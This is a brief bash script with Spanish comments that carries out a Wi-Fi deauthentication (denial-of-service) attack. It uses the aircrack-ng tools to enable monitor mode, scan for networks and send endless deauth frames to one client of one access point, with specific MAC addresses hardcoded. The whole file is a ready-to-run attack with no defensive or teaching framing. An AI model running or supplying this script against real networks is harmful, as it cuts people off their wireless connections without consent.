#! /bin/bash
# Ataque DDOS a un cliente de un ap encontrado con aircrack
# no funciona en: 802.11w
airmon-ng check kill
airmon-ng start wlan1
airodump-ng wlan1mon
airodump-ng wlan1mon --bssid E8:9F:80:13:BB:EC --channel 10
aireplay-ng --deauth 0 -c 04:E5:98:DF:3F:AE -a E8:9F:80:13:BB:EC wlan1mon